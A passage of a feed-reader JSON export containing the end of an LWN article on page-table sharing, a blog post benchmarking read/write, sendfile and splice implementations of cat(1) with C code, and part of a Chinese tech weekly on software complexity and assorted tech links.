href=\"https://lwn.net/ml/linux-mm/397f3cb2-1351-afcf-cd87-e8f9fb482059@redhat.com/\">pushing</a>\nfor a different sort of solution.  He would rather see a mechanism that\nwould automatically share page tables when mappings are shared, without\nrequiring application-level changes.  That would make the benefits of\nsharing more widely available while exposing fewer internal\nmemory-management details.\n</p><p>\nAutomatic sharing would need to have different semantics, though; otherwise\napplications will be surprised when an <tt>mprotect()</tt> or\n<tt>mremap()</tt> call in another process changes their mappings.  Though\nit was not stated in this version of Aziz's patch posting, the sense from\nthe LSFMM session was that the altered semantics were desirable.  If that\nis the case, fully automatic sharing will not be possible, since\napplications would have to opt in to that behavior.\n</p><p>\nEither way, it looks like this particular patch set needs more work and\ndiscussion before it can find its way into the mainline.  Until then,\napplications depending on sharing memory between large numbers of processes\nwill continue to pay a high page-table cost.<br clear=\"all\"></p><table>\n           <tbody><tr><th colspan=\"2\">Index entries for this article</th></tr>\n           <tr><td><a href=\"https://lwn.net/Kernel/Index\">Kernel</a></td><td><a href=\"https://lwn.net/Kernel/Index#Memory_management-Page-table_sharing\">Memory management/Page-table sharing</a></td></tr>\n            </tbody></table><br clear=\"all\">\n<div>\n               <table align=\"right\"><tbody><tr><td>\n               \n               \n               \n               </td></tr></tbody></table>\n               </div>\n               <br clear=\"all\">\n               <table align=\"right\"><tbody><tr><td>\n           \n           \n           </td></tr></tbody></table>\n           <br clear=\"all\">\n           <p>\n           \n</p>"
    },
    "origin": {
        "streamId": 22,
        "title": "LWN.net",
        "htmlUrl": "https://lwn.net/",
        "feedUrl": "http://lwnfeed:8080/feed.rss"
    }
},
{
    "id": "https://ariadne.space/?p=483",
    "timestampUsec": "1658161178222954",
    "categories": [
        "Uncategorized",
        "user/-/state/com.google/unread",
        "user/-/state/com.google/starred"
    ],
    "title": "How efficient can cat(1) be?",
    "author": ";Ariadne Conill",
    "published": 1658068920,
    "updated": 1658068920,
    "alternate": [
        {
            "href": "https://ariadne.space/2022/07/17/how-efficient-can-cat1-be/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p>There have been a few initiatives in recent years to implement new a new userspace base system for Linux distributions as an alternative to the GNU coreutils and BusyBox.  Recently, one of the authors of one of these proposed implementations made the pitch in a few IRC channels <a href=\"https://vimuser.org/cat.c.txt\">that her <code>cat</code> implementation</a>, which was derived from OpenBSD’s implementation, was the most efficient.  But is it actually?</p>\n\n\n\n<h2>Understanding what <code>cat</code> actually does</h2>\n\n\n\n<p>At the most basic level, <code>cat</code> takes one or more files and dumps them to <code>stdout</code>.  But do we need to actually use <code>stdio</code> for this?  Actually, we don’t, and most competent <code>cat</code> implementations at least use <code>read(2)</code> and <code>write(2)</code> if not more advanced approaches.</p>\n\n\n\n<p>If we consider <code>cat</code> as a form of buffer copy between an arbitrary file descriptor and <code>STDOUT_FILENO</code>, we can understand what the most efficient strategy to use for <code>cat</code> would be: splicing.  Anything which isn’t doing splicing, after all, involves unnecessary buffer copies, and thus cannot be the most efficient.</p>\n\n\n\n<p>To get the best performance out of spliced I/O, we have to have some prerequisites:</p>\n\n\n\n<ul><li>The source and destination file descriptors should be unbuffered.</li><li>Any intermediate buffer should be a multiple of the filesystem block size.  In general, to avoid doing a <code>stat</code> syscall, we can assume that a multiple of <code>PAGE_SIZE</code> is likely acceptable.</li></ul>\n\n\n\n<h2>A simple <code>cat</code> implementation</h2>\n\n\n\n<p>The simplest way to implement <code>cat</code> is the way that it is done in BSD: using <code>read</code> and <code>write</code> on an intermediate buffer.  This results in two buffer copies, but has the best portability.  Most implementations of <code>cat</code> work this way, as it generally offers good enough performance.</p>\n\n\n\n<pre><code>/* This program is released into the public domain. */\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;err.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;limits.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;unistd.h&gt;\n\nvoid dumpfile(const char *path)\n{\n\tint srcfd = STDIN_FILENO;\n\tchar buf[PAGE_SIZE * 16];\n\tssize_t nread, nwritten;\n\tsize_t offset;\n\n\t/* POSIX allows - to represent stdin. */\n\tif (*path != '-')\n\t{\n\t\tsrcfd = open(path, O_RDONLY);\n\t\tif (srcfd &lt; 0)\n\t\t\terr(EXIT_FAILURE, \"open %s\", path);\n\t}\n\n\twhile ((nread = read(srcfd, buf, sizeof buf)) &gt;= 1)\n\t{\n\t\tfor (offset = 0; nread &gt; 0; nread -= nwritten, offset += nwritten)\n\t\t{\n\t\t\tif ((nwritten = write(STDOUT_FILENO, buf + offset, nread)) &lt;= 0)\n\t\t\t\terr(EXIT_FAILURE, \"write stdout\");\n\t\t}\n\t}\n\n\tif (srcfd != STDIN_FILENO)\n\t\t(void) close(srcfd);\n}\n\nint main(int argc, const char *argv[])\n{\n\tint i;\n\n\tfor (i = 1; i &lt; argc; i++)\n\t\tdumpfile(argv[i]);\n\n\treturn EXIT_SUCCESS;\n}</code></pre>\n\n\n\n<h2>Implementing spliced I/O</h2>\n\n\n\n<p>Linux has no shortage of ways to perform spliced I/O.  For our <code>cat</code> implementation, we have two possible ways to do it.</p>\n\n\n\n<p>The first possible option is the venerable <code>sendfile</code> syscall, which was <a href=\"https://yarchive.net/comp/linux/sendfile.html\">originally added to improve the file serving performance of web servers</a>.  Originally, <code>sendfile</code> required the destination file descriptor to be a socket, but this restriction was removed in Linux 2.6.33.  Unfortunately, <code>sendfile</code> is not perfect: because it only supports file descriptors which can be memory mapped, we must use a different strategy when using copying from <code>stdin</code>.</p>\n\n\n\n<pre><code>/* This program is released into the public domain. */\n#include &lt;stdbool.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;err.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;limits.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/sendfile.h&gt;\n\nbool spliced_copy(int srcfd)\n{\n\tssize_t nwritten;\n\toff_t offset = 0;\n\n\tdo\n\t{\n\t\tnwritten = sendfile(STDOUT_FILENO, srcfd, &amp;offset,\n\t\t\t\t    PAGE_SIZE * 16);\n\t\tif (nwritten &lt; 0)\n\t\t\treturn false;\n\t} while (nwritten &gt; 0);\n\n\treturn true;\n}\n\nvoid copy(int srcfd)\n{\n\tchar buf[PAGE_SIZE * 16];\n\tsize_t nread, nwritten, offset;\n\n\twhile ((nread = read(srcfd, buf, sizeof buf)) &gt;= 1)\n\t{\n\t\tfor (offset = 0; nread &gt; 0;\n\t\t     nread -= nwritten, offset += nwritten)\n\t\t{\n\t\t\tif ((nwritten = write(STDOUT_FILENO,\n\t\t\t\t\t      buf + offset, nread)) &lt;= 0)\n\t\t\t\terr(EXIT_FAILURE, \"write stdout\");\n\t\t}\n\t}\n}\n\nvoid dumpfile(const char *path)\n{\n\tint srcfd = STDIN_FILENO;\n\tchar buf[PAGE_SIZE * 16];\n\n\t/* POSIX allows - to represent stdin. */\n\tif (*path != '-')\n\t{\n\t\tsrcfd = open(path, O_RDONLY);\n\t\tif (srcfd &lt; 0)\n\t\t\terr(EXIT_FAILURE, \"open %s\", path);\n\t}\n\n\t/* Fall back to traditional copy if the spliced version fails. */\n\tif (!spliced_copy(srcfd))\n\t\tcopy(srcfd);\n\n\tif (srcfd != STDIN_FILENO)\n\t\t(void) close(srcfd);\n}\n\nint main(int argc, const char *argv[])\n{\n\tint i;\n\tint stdout_flags;\n\n\tstdout_flags = fcntl(STDOUT_FILENO, F_GETFL);\n\tif (stdout_flags &lt; 0)\n\t\terr(EXIT_FAILURE, \"fcntl(STDOUT_FILENO, F_GETFL)\");\n\tstdout_flags &amp;= ~O_APPEND;\n\tif (fcntl(STDOUT_FILENO, F_SETFL, stdout_flags) &lt; 0)\n\t\terr(EXIT_FAILURE, \"fcntl(STDOUT_FILENO, F_SETFL)\");\n\n\tfor (i = 1; i &lt; argc; i++)\n\t\tdumpfile(argv[i]);\n\n\treturn EXIT_SUCCESS;\n}</code></pre>\n\n\n\n<p>Another approach is to use <code>splice</code> and a pipe.  This allows for true zero-copy I/O in userspace, as a pipe is simply implemented as a 64KB ring buffer in the kernel.  In this case, we just use two splice operations per block of data we want to copy: one to move the data to the pipe and another to move the data from the pipe to the output file.</p>\n\n\n\n<pre><code>/* This program is released into the public domain. */\n#define _GNU_SOURCE\n#include &lt;stdbool.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;err.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;limits.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/sendfile.h&gt;\n\n#define BLOCK_SIZE ((PAGE_SIZE * 16) - 1)\n\nbool spliced_copy(int srcfd)\n{\n\tint pipefd[2];\n\tssize_t nread, nwritten;\n\toff_t in_offset = 0;\n\tbool ret = true;\n\n\tif (pipe(pipefd) &lt; 0)\n\t\terr(EXIT_FAILURE, \"pipe\");\n\n\tdo\n\t{\n\t\tnread = splice(srcfd, &amp;in_offset, pipefd[1], NULL,\n\t\t\t       BLOCK_SIZE, SPLICE_F_MOVE | SPLICE_F_MORE);\n\t\tif (nread &lt;= 0)\n\t\t{\n\t\t\tret = nread &lt; 0 ? false : true;\n\t\t\tgoto out;\n\t\t}\n\n\t\tnwritten = splice(pipefd[0], NULL, STDOUT_FILENO, NULL,\n\t\t\t\t  BLOCK_SIZE, SPLICE_F_MOVE | SPLICE_F_MORE);\n\t\tif (nwritten &lt; 0)\n\t\t{\n\t\t\tret = false;\n\t\t\tgoto out;\n\t\t}\n\t} while (nwritten &gt; 0);\n\nout:\n\tclose(pipefd[0]);\n\tclose(pipefd[1]);\n\n\treturn ret;\n}\n\nvoid copy(int srcfd)\n{\n\tchar buf[PAGE_SIZE * 16];\n\tsize_t nread, nwritten, offset;\n\n\twhile ((nread = read(srcfd, buf, sizeof buf)) &gt;= 1)\n\t{\n\t\tfor (offset = 0; nread &gt; 0;\n\t\t     nread -= nwritten, offset += nwritten)\n\t\t{\n\t\t\tif ((nwritten = write(STDOUT_FILENO,\n\t\t\t\t\t      buf + offset, nread)) &lt;= 0)\n\t\t\t\terr(EXIT_FAILURE, \"write stdout\");\n\t\t}\n\t}\n}\n\nvoid dumpfile(const char *path)\n{\n\tint srcfd = STDIN_FILENO;\n\tchar buf[PAGE_SIZE * 16];\n\n\t/* POSIX allows - to represent stdin. */\n\tif (*path != '-')\n\t{\n\t\tsrcfd = open(path, O_RDONLY);\n\t\tif (srcfd &lt; 0)\n\t\t\terr(EXIT_FAILURE, \"open %s\", path);\n\n\t\t(void) posix_fadvise(srcfd, 0, 0, POSIX_FADV_SEQUENTIAL);\n\t}\n\n\t/* Fall back to traditional copy if the spliced version fails. */\n\tif (!spliced_copy(srcfd))\n\t\tcopy(srcfd);\n\n\tif (srcfd != STDIN_FILENO)\n\t\t(void) close(srcfd);\n}\n\nint main(int argc, const char *argv[])\n{\n\tint i;\n\tint stdout_flags;\n\n\tstdout_flags = fcntl(STDOUT_FILENO, F_GETFL);\n\tif (stdout_flags &lt; 0)\n\t\terr(EXIT_FAILURE, \"fcntl(STDOUT_FILENO, F_GETFL)\");\n\tstdout_flags &amp;= ~O_APPEND;\n\tif (fcntl(STDOUT_FILENO, F_SETFL, stdout_flags) &lt; 0)\n\t\terr(EXIT_FAILURE, \"fcntl(STDOUT_FILENO, F_SETFL)\");\n\n\tfor (i = 1; i &lt; argc; i++)\n\t\tdumpfile(argv[i]);\n\n\treturn EXIT_SUCCESS;\n}</code></pre>\n\n\n\n<h2>Honorable mention: <code>copy_file_range</code></h2>\n\n\n\n<p>While <code>copy_file_range</code> is not really that relevant to a <code>cat</code> implementation, if both the source and output files are normal files, you can use it to get even faster performance than using splice, as the kernel handles all of the details on its own.  An optimized <code>cat</code> might try this strategy and then downgrade to <code>splice</code>, <code>sendfile</code>, and the normal <code>read</code> and <code>write</code> loop.</p>\n\n\n\n<h2>Performance comparison</h2>\n\n\n\n<p>To measure the performance of each strategy, we can simply use <code>dd</code> as a sink, running each cat program piped into <code>dd of=/dev/null bs=64K iflag=fullblock</code>.  The runs in the table below are averaged across 1000 runs on a 8GB RAM Linode, using a 4GB file in <code>tmpfs</code>.</p>\n\n\n\n<figure><table><thead><tr><th>Strategy</th><th>Throughput</th></tr></thead><tbody><tr><td><code>cat-simple</code> (<code>read</code> and <code>write</code> loop)</td><td>3.6 GB/s</td></tr><tr><td><code>cat-sendfile</code></td><td>6.4 GB/s</td></tr><tr><td><code>cat-splice</code></td><td>11.6 GB/s</td></tr></tbody></table></figure>\n\n\n\n<p>If you are interested in using these implementations in your own <code>cat</code> implementation, you may do so under any license terms you wish.</p>"
    },
    "origin": {
        "streamId": 24,
        "title": "Ariadne's Space",
        "htmlUrl": "https://ariadne.space/",
        "feedUrl": "https://ariadne.space/feed/"
    }
},
{
    "id": "http://www.ruanyifeng.com/blog/2022/06/weekly-issue-210.html",
    "timestampUsec": "1658241091003658",
    "categories": [
        "Weekly",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "科技爱好者周刊（第 210 期）：为什么软件变得复杂",
    "author": "",
    "published": 1655426220,
    "updated": 1655426220,
    "alternate": [
        {
            "href": "http://www.ruanyifeng.com/blog/2022/06/weekly-issue-210.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p>这里记录每周值得分享的科技内容，周五发布。</p>\n<p>本杂志开源（GitHub: <a href=\"https://github.com/ruanyf/weekly\">ruanyf/weekly</a>），欢迎提交 issue，投稿或推荐科技内容。</p>\n\n<p>周刊讨论区的帖子<a href=\"https://github.com/ruanyf/weekly/issues/2426\">《谁在招人？》</a>，提供大量程序员就业信息，欢迎访问或发布工作/实习岗位。</p>\n\n<h2>封面图</h2>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061615.webp\" alt=\"\" title=\"\"></p>\n\n<p>中国科学家绘制的世界首幅、最详细的1:250万月球全月地质图发布，统计出月球包含12341个撞击坑、17种岩石、14类地质构造。（<a href=\"http://www.cnsa.gov.cn/n6758823/n6758838/c6840495/content.html\">via</a>）</p>\n\n<h2>本周话题：为什么软件变得复杂</h2>\n\n<p>我一直认为，软件开发的最大关注点，就是避免复杂性。软件设计越简单越好，太多的程序员以构建复杂的解决方案为荣。</p>\n\n<p>但是，本周有一篇文章让我反思，我的想法是不现实的：<strong>软件肯定会越变越复杂。</strong></p>\n\n<p>（一）</p>\n\n<p>这篇文章的作者是 Saleforce 公司的前端工程师诺拉·劳森（Nolan Lawson），题目就叫做<a href=\"https://nolanlawson.com/2022/06/09/the-collapse-of-complex-software/\">《复杂软件的崩溃》</a>（下图）。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061407.webp\" alt=\"\" title=\"\"></p>\n\n<p>大家可能知道，Salesforce 是一家世界级软件公司，专门开发企业软件，以产品复杂而闻名。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061406.webp\" alt=\"\" title=\"\"></p>\n\n<p>所以，这件事情很讽刺。一家出产复杂软件的公司，自家的著名程序员公开说，复杂软件会崩溃。</p>\n\n<p>当然，他在文章里面没提 Salesforce 的名字，但是怎么读都像在写亲身经历。下面摘录一段他的原文和配图，大家品味一下。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061408.webp\" alt=\"\" title=\"\"></p>\n\n<blockquote>\n  <p>\"任何在科技行业工作足够长的人，尤其是在大公司工作的人，都曾见过下面的场景。</p>\n\n<p>有一个遗留系统，很大很复杂，没有人完全理解它是如何工作的。</p>\n\n<p>架构师被要求\"修复\"系统，他们找来一块大的白板，把这个大系统分解成很多方框和箭头。对于遇到的问题，他们的解决方案就是......添加更多方框和箭头。没有任何一个可以从系统中消去，每个人都只是加上自己的那部分。</p>\n</blockquote>\n\n<p>这一段是不是写得很形象，就像是日常场景的描述。</p>\n\n<p>根据他的文章，我整理了一下，Saleforce 内部的情况大概是这样的。</p>\n\n<blockquote>\n  <ol start=\"1\">\n<li>客户的需求非常复杂。为了满足这些需求，大型软件不可避免变得复杂。</li>\n<li>软件公司的管理者真正在意的不是系统的复杂性，而是利润。只要软件能赚钱，高层并不在意软件变得复杂。</li>\n<li>软件复杂性都落到少数架构师和高级程序员的头上。每个人加上自己的解决方案（方框和箭头），让软件越来越复杂，然后不可避免地，他们就会在一段时间后离开公司。</li>\n<li>复杂系统最终变得难以理解和维护，唯一的解决方法就是放弃旧系统，从头开始写一个新系统。</li>\n</ol>\n</blockquote>\n\n<p>所以，诺拉·劳森的结论很悲观：<strong>怎么解决软件的复杂性？解决不了。最后就是你走人，公司把软件推倒重来。</strong></p>\n\n<p>这就是一个大厂高级程序员的真实想法。国内的情况其实差不多，上面的描述完全适用于 BAT 内部的复杂系统。</p>\n\n<p>（二）</p>\n\n<p>诺拉·劳森还说了一个观点。大家通常认为，复杂系统往往会在经济繁荣的时候崩溃，因为业务太多，支撑不过来，但他认为不是这样的，<strong>系统崩溃往往发生在经济收缩期。</strong></p>\n\n<p>经济繁荣时期，软件公司会大量雇佣新员工，投入更多的财力和人力，支撑复杂系统。等到经济收缩期，公司开始减少投入、冻结招聘或裁员，复杂系统可能就会在这个时候出问题，变得难以维护。</p>\n\n<p>现在就是经济收缩期，那么接下来，会不会就是软件故障的高发期，我们将看到很多复杂系统的崩溃？</p>\n\n<h2>前端高频面试题（2022版）</h2>\n\n<p>这两年，客观地说，前端开发的热度有所下降。主要原因是前端技术逐步稳定，以及智能手机的普及度见顶了。</p>\n\n<p>但是，前端依然是 IT 行业中最活跃的分支。一年一度的 <a href=\"https://octoverse.github.com/\">GitHub 调查</a>中，JavaScript 多年来一直稳居第一，TypeScript 更是快速上升到今年的第四位，仅次于 Python 和 Java。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061616.webp\" alt=\"\" title=\"\"></p>\n\n<p>技术稳定带来的一个后果，就是新框架、新工具少了，大家更关注已有框架/工具的改进和功能增加。</p>\n\n<p>大厂的前端团队也转向了精细化探索，注重如何做得更细、更好，垂直化的技术领域（比如可视化、工程化等）得到了更多的关注。企业的用人要求也越来越高，从能够上手工作就可以要人，变成了要求深入某个领域。</p>\n\n<p>总的来说，<ins>现在的前端开发处在下图右侧的那个椭圆，比前一个阶段的难度上升了</ins>。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061617.webp\" alt=\"\" title=\"\"></p>\n\n<p>如果你已经有一定的前端开发基础，近期打算应聘前端岗位，这里有一份有用的资料，可以帮助大家准备面试。</p>\n\n<p>这份资料就是 <strong>《前端大厂的高频面试题（2022版）》</strong>，一共有174页，收集了最新的面试题，由国内著名的程序员培训平台\"极客时间\"联系国内大厂制作。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061620.webp\" alt=\"\" title=\"\"></p>\n\n<p>所有的题目都分门别类，由浅入深排列，每道题都附有答案详解，方便大家知识梳理、准备面试。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061618.webp\" alt=\"\" title=\"\"></p>\n\n<p>此外，还会额外赠送 <strong>《三位资深程序员的面试跳槽经验分享》</strong>，分享技术之外的跳槽准备、简历准备、面试应对......这些值得借鉴的前人经验。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061619.webp\" alt=\"\" title=\"\"></p>\n\n<p>微信扫描上方二维码，就可以 <strong>免费领取</strong> 这份前端面试资料。添加客服后，请耐心等待，后台是手动通过的。</p>\n\n<p>最后提醒一下，<ins>这份资料不适合刚刚学习前端的学生，更适合有前端开发基础和编程经验的从业人员。</ins></p>\n\n<h2>科技动态</h2>\n\n<p>1、<a href=\"https://gizmodo.com/vr-researches-simulate-kisses-with-ultrasonic-transduce-1848849489\">虚拟接吻</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/220204/bg2022043003.webp\" alt=\"\" title=\"\"></p>\n\n<p>卡内基梅隆大学开发了一种新技术，让 VR 头盔的佩戴者可以感受到虚拟接吻。具体做法是，头盔向嘴唇发射超声波，里面包含了一些微小颗粒，让嘴唇、牙齿甚至舌头产生触感。</p>\n\n<p>上图可以看到，VR 头盔的下方安装了一排超声波发生器，对准红点的位置发射。科学家开玩笑，可以用它开发\"接吻机\"。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/220204/bg2022043004.webp\" alt=\"\" title=\"\"></p>\n\n<p>除了产生嘴唇的触感，这种技术还可以在游戏中，让用户感受到风拂过脸部、蜘蛛网碰到脸，甚至食物和饮料进入嘴里的虚拟感受。</p>\n\n<p>上图是一只巨大的虚拟蜘蛛将大量毒药倾泻到用户身上，用户可以感觉到毒药溅到嘴唇上。</p>\n\n<p>2、<a href=\"http://www.lanxiongsports.com/posts/view/id/22687.html\">LED 篮球场</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022060807.webp\" alt=\"\" title=\"\"></p>\n\n<p>5月30日，国际篮联正式宣布，允许篮球世界杯等大赛启用 LED 篮球场。</p>\n\n<p>传统的篮球场都是木地板，木头具有弹性，可以吸收震动，保护球员。现在，最新的 LED 玻璃也已经能够提供足够的弹性。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022060808.webp\" alt=\"\" title=\"\"></p>\n\n<p>LED 球场有很多好处，省去了划线的麻烦，能够快速切换成篮球场、手球场、排球场、羽毛球场。</p>\n\n<p>并且，它自身能发光，可以作为显示屏，实时显示比赛数据，并且配合球场活动，营造气氛。在黑暗中，界线依然保持醒目。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022060809.webp\" alt=\"\" title=\"\"></p>\n\n<p>3、<a href=\"https://bjoernkarmann.dk/occlusion-grotesque\">树皮字体</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202205/bg2022050302.webp\" alt=\"\" title=\"\"></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202205/bg2022050306.webp\" alt=\"\" title=\"\"></p>\n\n<p>五年前，一个丹麦艺术家将字体刻在一棵树上，想看看随着树木的成长，字体会变成什么样，也就是大自然会怎样呈现字体。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202205/bg2022050307.webp\" alt=\"\" title=\"\"></p>\n\n<p>下面是字母 a 和 o 在五年中的变化。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202205/bg2022050303.webp\" alt=\"\" title=\"\"></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202205/bg2022050304.webp\" alt=\"\" title=\"\"></p>\n\n<p>这些字体应用到印刷品，就是下面的样子。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202205/bg2022050305.webp\" alt=\"\" title=\"\"></p>\n\n<p>他发现，这些字母主要是横向成长，变得更宽更粗，高度反而变化不大。这说明，树木成形后，树干高度就基本不再变化了，开始不断长粗。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202205/bg2022050308.webp\" alt=\"\" title=\"\"></p>\n\n<p>4、<a href=\"https://www.cnbc.com/2022/04/26/biden-blocks-sales-of-inefficient-lightbulbs-reversing-trump-policy-.html\">禁止白炽灯泡</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202205/bg2022050502.webp\" alt=\"\" title=\"\"></p>\n\n<p>拜登政府宣布，美国将禁止销售每瓦产生低于45流明的灯泡。这实际上禁掉了白炽灯泡。</p>\n\n<p>这个决定是为了提高照明的能量效率。一般来说，白炽灯泡每瓦的发光量在10流明左右，LED 灯泡则可以达到每瓦100流明以上。</p>\n\n<h2>文章</h2>\n\n<p>1、<a href=\"https://www.chuapp.com/?a=index&amp;c=Article&amp;id=288712\">我为什么与中国游戏发行商签约又分手</a>（中文）</p>\n\n<p>这是一篇日本独立游戏开发者的文章，被译成了中文。作者以亲身经历，解释了目前的独立游戏的发行制度和现状。</p>\n\n<p>2、<a href=\"https://finance.sina.com.cn/tech/2022-06-14/doc-imizirau8363822.shtml\">Intel 4 工艺宣布</a>（中文）</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061609.webp\" alt=\"\" title=\"\"></p>\n\n<p>上周，英特尔公司正式宣布了 Intel 4 工艺。这是英特尔公司第一次将 EUV 技术用于 CPU 的生产，实现了7纳米的制程，开始追赶台积电。本文介绍该工艺的一些情况。</p>\n\n<p>3、<a href=\"https://icloudnative.io/posts/budget-nas/\">我如何搭建家用 NAS</a>（中文）</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022060906.webp\" alt=\"\" title=\"\"></p>\n\n<p>本文详细记录了作者选购硬件、安装软件，搭建一台 22TB 的家用 NAS （网络存储）服务器的过程，可以当作自己架设 NAS 的参考。这里是中文翻译，另有<a href=\"https://mtlynch.io/budget-nas/\">英文原文</a>。（<a href=\"https://github.com/ruanyf/weekly/issues/2444\">@yangchuansheng</a> 投稿）</p>\n\n<p>4、<a href=\"https://ugmonk.com/blogs/journal/analog-the-simplest-productivity-system\">最简单的任务管理系统</a>（英文）</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202202/bg2022021201.webp\" alt=\"\" title=\"\"></p>\n\n<p>本文介绍作者自己发明的最简单任务管理系统，就是把每天的任务写在卡片上，用一个架子放在眼前，做完一件就划掉一件。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202202/bg2022021202.webp\" alt=\"\" title=\"\"></p>\n\n<p>5、<a href=\"https://www.backblaze.com/blog/free-image-hosting-with-cloudflare-transform-rules-and-backblaze-b2/\">使用 Cloudflare + Backblaze B2 打造一个免费的图像 CDN</a>（英文）</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202202/bg2022021604.webp\" alt=\"\" title=\"\"></p>\n\n<p>本文是一篇详细的教程，教你怎么把图片托管在 Backblaze B2 对象存储，然后连接到 Cloudflare 的 CDN 服务。两者都有免费额度，对于小网站来说，不用花钱就解决了图片的存储和带宽问题。</p>\n\n<p>6、<a href=\"https://nick.comer.io/post/ios-shortcuts\">如何用 iOS 快捷指令防止沉迷？</a>（英文）</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202201/bg2022010401.webp\" alt=\"\" title=\"\"></p>\n\n<p>作者发现自己在社交媒体上，浪费了大量时间。他想出了一个办法，制作了一个 iOS 快捷指令（shortcuts），只要一打开社交 App，就会跳出提示\"请专心工作\"。</p>\n\n<p>7、<a href=\"https://blog.fidelramos.net/photography/photography-workflow#5-replication-with-syncthing\">我的免费摄影软件工作流</a>（英文）</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/220204/bg2022040609.webp\" alt=\"\" title=\"\"></p>\n\n<p>作者是一个专业的摄影师，完全采用免费软件处理数码照片。本文介绍他的解决方案。</p>\n\n<p>8、<a href=\"https://cprimozic.net/blog/my-selfhosted-websites-architecture/#backup--disaster-recovery\">我在单个服务器上托管几十个网站</a>（英文）</p>\n\n<p>作者详细介绍，他如何在一个服务器上托管几十个网站，大部分是 API 调用。这里最大的难题还不是把服务架起来，而是如何同时维护和管理它们。</p>\n\n<p>9、<a href=\"https://tomtunguz.com/how-much-money-flowing-into-crypto/\">如何估算流入加密货币的资金</a>（英文）</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202202/bg2022020302.webp\" alt=\"\" title=\"\"></p>\n\n<p>多少资金流入了加密货币市场？这显然是无法准确计算的，作者想到了一个办法，可以间接估算。那就是看稳定币每月增长的发行量，上图是过去两年稳定币每个月的增长百分比。</p>\n\n<h2>工具</h2>\n\n<p>1、<a href=\"https://cloudmp3.cc/en/\">CloudMP3.cc</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/220204/bg2022041702.webp\" alt=\"\" title=\"\"></p>\n\n<p>一个云服务，可以将 SoundCloud 上面的音频，转成 mp3 下载。</p>\n\n<p>2、<a href=\"https://github.com/ToolJet/ToolJet\">ToolJet</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202203/bg2022031912.webp\" alt=\"\" title=\"\"></p>\n\n<p>一个低代码框架，用来开发内部工具。部署到服务器后，它有一个 Web 界面，通过拖拽，就可以连接各种数据源，生成各种应用或管理面板。</p>\n\n<p>3、<a href=\"https://secreter.github.io/ireader/index.html\">i 微信读书</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061503.webp\" alt=\"\" title=\"\"></p>\n\n<p>Chrome 浏览器插件，配合网页版微信读书使用，支持划线摘抄句子、划线生成分享图片、一键导出笔记等功能。（<a href=\"https://github.com/ruanyf/weekly/issues/2439\">@secreter</a> 投稿）</p>\n\n<p>4、<a href=\"https://github.com/sogou/workflow\">Sogou C++ Workflow</a></p>\n\n<p>搜狗公司开源的 C++ 服务器引擎，支撑搜狗几乎所有后端 C++ 在线服务，提供了大量异步服务的功能。（<a href=\"https://github.com/ruanyf/weekly/issues/2446\">@Barenboim</a> 投稿）</p>\n\n<p>5、<a href=\"https://doc.fastgit.org/zh-cn/guide.html\">FastGit</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061504.webp\" alt=\"\" title=\"\"></p>\n\n<p>GitHub 有时在国内不容易打开，这里有一个服务是 GitHub 的镜像加速器。提醒一下，如果要登陆 GitHub，使用这种服务会有安全顾虑，大家自己权衡。（<a href=\"https://github.com/ruanyf/weekly/issues/2448\">@dllen</a> 投稿）</p>\n\n<p>6、<a href=\"http://ldapdoc.eryajf.net/\">Go-Ldap-Admin</a></p>\n\n<p><img 